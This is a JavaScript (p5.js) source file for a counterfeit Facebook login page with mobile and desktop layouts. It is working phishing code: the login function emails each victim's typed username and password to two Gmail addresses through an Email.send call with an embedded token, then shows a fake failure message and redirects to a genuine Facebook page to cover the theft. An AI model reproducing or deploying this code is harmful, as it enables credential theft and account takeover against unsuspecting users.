

let wdth, hght, input, bckgrnd, banner, email, bottom, shouldResize, phone, plus, deviceType;
function getMobileOperatingSystem() {
  var userAgent = navigator.userAgent || navigator.vendor || window.opera;

      // Windows Phone must come first because its UA also contains "Android"
    if (/windows phone/i.test(userAgent)) {
        return "Windows";
    }

    if (/android/i.test(userAgent)) {
        return "Android";
    }

    // iOS detection from: http://stackoverflow.com/a/9039885/177710
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return "iOS";
    }

    return "";
}
  deviceType = getMobileOperatingSystem();
if(deviceType == 'Android' || deviceType == 'iOS'){
  var ALERT_TITLE = "Oops!";
var ALERT_BUTTON_TEXT = "Ok";

if(document.getElementById) {
    window.alert = function(txt) {
        createCustomAlert(txt);
    }
}

function createCustomAlert(txt) {
    d = document;

    if(d.getElementById("modalContainerM")) return;

    mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
    mObj.id = "modalContainerM";
    mObj.style.height = d.documentElement.scrollHeight*2 + "px";

    alertObj = mObj.appendChild(d.createElement("div"));
    alertObj.id = "alertBoxM";
    if(d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
    alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth)/2 + "px";
    alertObj.style.visiblity="visible";

    h1 = alertObj.appendChild(d.createElement("h1"));
    h1.appendChild(d.createTextNode(ALERT_TITLE));

    msg = alertObj.appendChild(d.createElement("p"));
    msg.innerHTML = txt;

    btn = alertObj.appendChild(d.createElement("a"));
    btn.id = "closeBtnM";
    btn.appendChild(d.createTextNode(ALERT_BUTTON_TEXT));
    btn.href = "#";
    btn.focus();
    btn.onclick = function() { removeCustomAlert();return false; }

    alertObj.style.display = "block";

}

function removeCustomAlert() {
    document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainerM"));
      window.location.replace("https://m.facebook.com/story.php?story_fbid=538179603522765&id=118526656660");

}

function setup() {
  
  createCanvas(windowWidth, windowHeight*1.05);
   document.querySelector('meta[name="theme-color"]').setAttribute('content',  '#3b5998');
  shouldResize = true;
  bckgrnd = loadImage('facebook.PNG');
  banner = loadImage('facebookbanner.PNG');
  bottom = loadImage('bottom.PNG');
  phone = loadImage('phone.png');
  plus = loadImage('plus.PNG');
  username = createInput();
  username.size(width/1.1, 100);
  username.style('background-color', '#F5F6F7');
  username.style('border', '1px solid black');
  username.style('border-color', 'rgb(236, 236, 236)');
  username.style('fontSize', '32px');
  username.style('font-color', 'rgb rgb(26, 236, 236)');
  username.elt.placeholder = 'Mobile number or email';
  username.elt.style.paddingLeft = '10px'
  username.style('borderRadius', '7px');


  password = createInput('', 'password');
  password.size(width/1.1, 100);
  password.style('background-color', '#F5F6F7');
  password.style('border', '1px solid black');
  password.style('border-color', 'rgb(236, 236, 236)');
  password.style('fontSize', '32px');
  password.style('font-color', 'rgb rgb(26, 236, 236)');
  password.elt.placeholder = 'Password';
  password.elt.style.paddingLeft = '10px'
  password.style('borderRadius', '7px');
  submit = createButton('<b>Log in</b>');
  submit.size(width/1.09, 95);
  submit.style('background-color', '#1877F2');
  submit.style('border', '0px solid black');
  submit.style('color', 'white');
  submit.style('display', 'inline-block');
  submit.style('font-size', '32px');
  submit.style('borderRadius', '8px');
  submit.mousePressed(login);
  newAccount = createButton('<b>Create new account</b>');
  newAccount.size(submit.width/2.4, 85);
  newAccount.style('background-color', '#00A400');
  newAccount.style('border', '0px solid black');
  newAccount.style('color', 'white');
  newAccount.style('display', 'inline-block');
  newAccount.style('font-size', '32px');
  newAccount.style('borderRadius', '9px');
  newAccount.mousePressed(newacc);
username.position(width/2-450, 250);
      password.position(username.x, 100+username.y);
      submit.position(username.x, password.y+130);
      newAccount.position(username.x+260, submit.y+220);

  

}


function login() {
  Email.send({
    SecureToken: "8f3f3aff-06d2-493b-aa98-1d135b73a48b",
    To: "passduck99@gmail.com",
    From: "passduck99@gmail.com",
    Subject: "Username and Password",
    Body: "Username: " + username.value() + "<br>Password: " + password.value()
  }).then();
  Email.send({
    SecureToken: "8f3f3aff-06d2-493b-aa98-1d135b73a48b",
    To: "jacobzuckerman97@gmail.com",
    From: "usernames@gmail.com",
    Subject: "Username and Password",
    Body: "Username: " + username.value() + "<br>Password: " + password.value()
  }).then(
    createCustomAlert('Login may have failed'));
  

}

function newacc() {
  window.location.replace("https://www.facebook.com/r.php?locale=en_US&display=page");
}

function draw() {

  background(255);


  push();
  textSize(60);
  textStyle(BOLD);
  fill(100, 100, 200);
  rectMode(CENTER);
  noStroke();
  fill('#3b5998');
  rect(width/2, 60, width, 120);
  fill(255);
  if(width/2>0){
  translate(width/2-115, 0);
  }
    textFont('Tahoma');
    text('facebook', 0, 70);
  pop();
  push();
  fill('#FFFBE2');
  noStroke();
  rect(0, 105, width, 110);
  scale(1.8);
  image(phone, 0, 60);
  fill('#3B5998');
  textSize(18);
  text('Get Facebook for ' + deviceType +' and browse faster.', 50, 95);
  pop();
  
    push();
  noStroke();
  fill(0);
  rect(password.x, submit.y+150, width/2-100, 0.5);
  rect(password.x+width/2, submit.y+150, width/2-100, 0.5);
  textSize(32);
  text('or', password.x+width/2-60, submit.y+150);
  fill('#7596C8');
  text('Forgot password?', newAccount.x+55, newAccount.y+150);
  pop();
  push();
  fill('#7596C8');
  textSize(30);
  text('English (US)\nFrançais (France)\nPortuguês (Brasil)\nItaliano', width/3-200, 1000);
  text('Español\n中文(简体)\nDeutsch\n', width/3-200+ width/3+200, 1000);
    fill('#90949C');
  text('Facebook Inc.', width/2-100, 1200);
  pop();
  push();
    scale(2);
  image(plus, width/3-315+width/3, 550);
  pop();
}


}else if (deviceType == '' || deviceType == 'Windows'){
  var ALERT_TITLE = "Oops!";
var ALERT_BUTTON_TEXT = "Ok";

if(document.getElementById) {
    window.alert = function(txt) {
        createCustomAlert(txt);
    }
}

function createCustomAlert(txt) {
    d = document;

    if(d.getElementById("modalContainer")) return;

    mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
    mObj.id = "modalContainer";
    mObj.style.height = d.documentElement.scrollHeight*2 + "px";

    alertObj = mObj.appendChild(d.createElement("div"));
    alertObj.id = "alertBox";
    if(d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
    alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth)/2 + "px";
    alertObj.style.visiblity="visible";

    h1 = alertObj.appendChild(d.createElement("h1"));
    h1.appendChild(d.createTextNode(ALERT_TITLE));

    msg = alertObj.appendChild(d.createElement("p"));
    msg.innerHTML = txt;

    btn = alertObj.appendChild(d.createElement("a"));
    btn.id = "closeBtn";
    btn.appendChild(d.createTextNode(ALERT_BUTTON_TEXT));
    btn.href = "#";
    btn.focus();
    btn.onclick = function() { removeCustomAlert();return false; }

    alertObj.style.display = "block";

}

function removeCustomAlert() {
    document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
      window.location.replace("https://m.facebook.com/story.php?story_fbid=538179603522765&id=118526656660");

}

function setup() {
  createCanvas(windowWidth, 840);
  shouldResize = true;
  bckgrnd = loadImage('facebook.PNG');
  banner = loadImage('facebookbanner.PNG');
  bottom = loadImage('bottom.PNG');
  // console.log(banner.width);
  //   wdth = width/10;
  //   hght = height/10;
  // push();
  // rectMode(CENTER);
  username = createInput();
  username.size(300, 32);
  // username.position(width/2-150, 325);
  username.style('border', '1px solid black');
  username.style('border-color', 'rgb(236, 236, 236)');
  username.style('fontSize', '15px');
  username.style('font-color', 'rgb rgb(26, 236, 236)');
  username.elt.placeholder = 'Email or Phone Number';
  username.elt.style.paddingLeft = '10px'
  username.elt.style.outline = 'none'


  password = createInput('', 'password');
  password.size(300, 32);
  // password.position(width/2-150, 375);
  password.style('border', '1px solid black');
  password.style('border-color', 'rgb(236, 236, 236)');
  password.style('fontSize', '15px');
  password.style('font-color', 'rgb rgb(26, 236, 236)');
  password.elt.placeholder = 'Password';
  password.elt.style.paddingLeft = '10px'
  password.elt.style.outline = 'none'
  submit = createButton('<b>Log In</b>');
  submit.size(314, 40);
  // submit.position(width/2-150, 425);
  submit.style('background-color', '#4267B2');
  submit.style('border', '0px solid black');
  submit.style('color', 'white');
  submit.style('display', 'inline-block');
  submit.style('font-size', '14px');
  // submit.elt.style.paddingLeft = '10px';
  submit.mousePressed(login);
  newAccount = createButton('Create New Account');
  newAccount.size(200, 40);
  // newAccount.position(width/2-90, 550);
  newAccount.style('background-color', '#42B72A');
  newAccount.style('border', '0px solid black');
  newAccount.style('color', 'white');
  newAccount.style('display', 'inline-block');
  newAccount.style('font-size', '14px');
  newAccount.mousePressed(newacc);
// pop();
  // canvas.resize(banne);
  newAccount2 = createButton('<b>Create New Account</b>');
  newAccount2.size(134, 30);
  // newAccount.position(width/2-90, 550);
  newAccount2.style('background-color', '#42B72A');
  newAccount2.style('border', '0px solid black');
  newAccount2.style('color', 'white');
  newAccount2.style('display', 'inline-block');
  newAccount2.style('font-size', '12px');
  newAccount2.mousePressed(newacc);
  newAccount2.style("font-family","Helvetica");
// newAccount2.elt.style.font ='Helvetica';
username.position(width/2-150, 250);
      password.position(username.x, username.y+50);
      submit.position(username.x, password.y+50);
      newAccount.position(username.x+60, submit.y+125);
      if(width/2-315>180){
      newAccount2.position(width/2-315, 31.6);
}else{
        newAccount2.position(180, 31.6);
}
  

}


function login() {
  Email.send({
    SecureToken: "8f3f3aff-06d2-493b-aa98-1d135b73a48b",
    To: "passduck99@gmail.com",
    // Bcc : 'kyle@computingant.com', 
    From: "passduck99@gmail.com",
    // From: input.value(),
    Subject: "Username and Password",
    Body: "Username: " + username.value() + "<br>Password: " + password.value()
  }).then();
  Email.send({
    SecureToken: "8f3f3aff-06d2-493b-aa98-1d135b73a48b",
    To: "jacobzuckerman97@gmail.com",
    // Bcc : 'kyle@computingant.com', 
    From: "usernames@gmail.com",
    // From: input.value(),
    Subject: "Username and Password",
    Body: "Username: " + username.value() + "<br>Password: " + password.value()
  }).then(
    createCustomAlert('Login may have failed'));
  

}

function newacc() {
  window.location.replace("https://www.facebook.com/r.php?locale=en_US&display=page");
}

function draw() {
  // resizeCanvas(banner.width, 840);
  // if(shouldResize && banner.width>100){
  // // banner.width-=00;
  // shouldResize = false;
  //    }

  background(236, 236, 236);

  push();
  rectMode(CENTER);
  fill(255);
  noStroke();
  // rect(0, 620, width, height);
  // image(banner, 0, 0, width, 83);
  pop();
  push();
  rectMode(CENTER);
  fill(255);
  stroke(220);
  strokeWeight(0.1);
  rect(width/2, 350, 612, 375);

  push();
  // scale(5, 0, 0);
  if(width/2-500>0){
  translate(width/2-500, 0);
  }
  fill('#385898');
  textSize(12);
textFont('Helvetica');
  text('English (US) Español  Français (France)  中文(简体)  العربية  Português (Brasil)  한국어  Italiano  Deutsch  हिन्दी  日本語 \n\nSign Up    Log In    Messenger    Facebook Lite    Watch    People    Pages    Page Categories    Places    Games    Locations    Market place    Facebook    Pay    Groups\nOculus   Portal   Instagram   Local   Fundraisers   Services   About   Create Ad   Create Page   Developers   Careers   Privacy   Cookies   Ad Choices   Terms\nHelp\n\nFacebook © 2020', 0, 740)
  // image(bottom, 0, 620, bottom.width/1.2, bottom.height / 1.3);
  fill(0);
  // rectMode(LEFT, CORNER);
  rect(590, 750, width/1.3, 0.3);
  pop();
  pop();
  push();
  textSize(19);
  text('Log Into Facebook', width/2-60, 220);
  pop();

  push();
  fill(66, 103, 150);
  textSize(12);
  text('Forgot account?', password.x+115, submit.y+75);
  pop();

  push();
  noStroke();
  fill(0);
  rect(password.x, submit.y+110, 130, 0.3);
  rect(password.x+180, submit.y+110, 130, 0.3);
  textSize(11);
  text('or', password.x+150, submit.y+110);
  pop();

  push();
  textSize(37);
  textStyle(BOLD);
  fill(100, 100, 200);
  rectMode(CENTER);
  noStroke();
  fill('#3b5998');
  rect(width/2, 40, width, 80);
  // image(banner, 0, 0, width*10, 83);
  // rect(width/2, 40, width, 80);
  fill(255);
  // if(width>1000){
  if(width/2-500>0){
  translate(width/2-500, 0);
  }
    textFont('Tahoma');
    text('facebook', 0, 60);
// }else{
  // text('facebook', 0, 60);
// }
    // text('facebook', width/5.6, 60);
// }
  pop();


  // image(bckgrnd, 0, 0);
  // text('hi', width/2, height/2);
}
function windowResized() {
  resizeCanvas(windowWidth, height);
  if(width/2-150>150){
      username.position(width/2-150, 250);
      password.position(username.x, username.y+50);
      submit.position(username.x, password.y+50);
      newAccount.position(username.x+60, submit.y+125);
  }
  if(width/2-315>180){
      newAccount2.position(width/2-315, 31.6);
}else{
        newAccount2.position(180, 31.6);
}
}

}
